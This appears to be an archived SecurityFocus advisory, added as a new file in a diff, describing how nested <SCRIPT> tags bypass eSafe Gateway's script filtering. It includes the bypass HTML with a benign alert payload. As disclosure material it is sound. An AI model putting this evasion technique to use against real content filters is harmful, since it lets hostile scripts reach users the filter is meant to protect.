@@ -1,0 +1,46 @@
+source: http://www.securityfocus.com/bid/2750/info
+
+eSafe Gateway is a security utility used for filtering internet content.
+
+An html file may be crafted to bypass the script-filtering feature offered by eSafe Gateway. This is done by simply changing the syntax of the <SCRIPT> function in such a way as to trick the filter into generating html that still includes a call to execute the script.
+
+Note: There are currently conflicting details regarding this vulnerability. It has been reported that version 3.0 of eSafe Gateway is not vulnerable. The author of the advisory insists that versions 2.x are vulnerable, while the vendor claims that script filtering was not a feature in these versions. Forthcoming updates will be released as more information becomes available.
+
+Details
+----------------------
+Let's say for example that we want the following HTML code to enter an
+organization and the script it contains to be executed:
+
+<HTML><HEAD></HEAD>
+<BODY>
+<SCRIPT language="JavaScript">
+alert("hi");
+</SCRIPT>
+</BODY></HTML>
+
+If we run this page through eSafe's filtering engine, the script will be
+filtered and the resulting with the following HTML code:
+
+<HTML><HEAD></HEAD>
+<BODY>
+
+</BODY></HTML>
+
+However, if we create the following code:
+
+<HTML><HEAD></HEAD>
+<BODY>
+<SCRIPT<script language="javascript"> </script> language="javascript">
+alert("hi");
+</SCRIPT>
+</BODY></HTML>
+
+Then the inner "<script language="javascript"> </script>" will be extracted
+and we will be left with the following HTML code:
+
+<HTML><HEAD></HEAD>
+<BODY>
+<SCRIPT language="javascript">
+alert("hi");
+</SCRIPT>
+</BODY></HTML> 
